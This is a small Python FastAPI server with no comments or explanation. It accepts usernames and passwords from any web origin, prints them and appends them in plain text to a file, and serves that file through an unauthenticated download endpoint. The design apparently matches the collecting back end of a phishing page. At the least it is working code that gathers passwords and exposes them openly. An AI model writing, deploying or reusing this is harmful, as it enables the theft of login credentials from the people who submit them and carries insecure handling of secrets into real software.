from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware 
from fastapi.responses import FileResponse
import uvicorn
import os

app = FastAPI() 

app.add_middleware( CORSMiddleware, allow_origins=["*"], allow_credentials=False, allow_methods=["*"], allow_headers=["*"], )

@app.post("/api/sendInformation")
def getInformation(data: dict):
    
    print("data: " , data)

    username = data["username"]
    password = data["password"]

    print(f"username: {username}")
    print(f"password: {password}")

    with open("information.txt" , "a") as f:
        f.write(f"{data} \n")
        print("suceessfully saved information")

    return {
        "Message": "ok"
    }

@app.get("/download")
def download():

    if not os.path.exists("information.txt"):
        return {
            "error": "no file found"
        }
    
    return FileResponse(
        "information.txt",
        media_type="text/plain"
    )


if __name__ == "__main__":
    uvicorn.run(app,host="127.0.0.1",port=5000)
    print("running on port 5000")
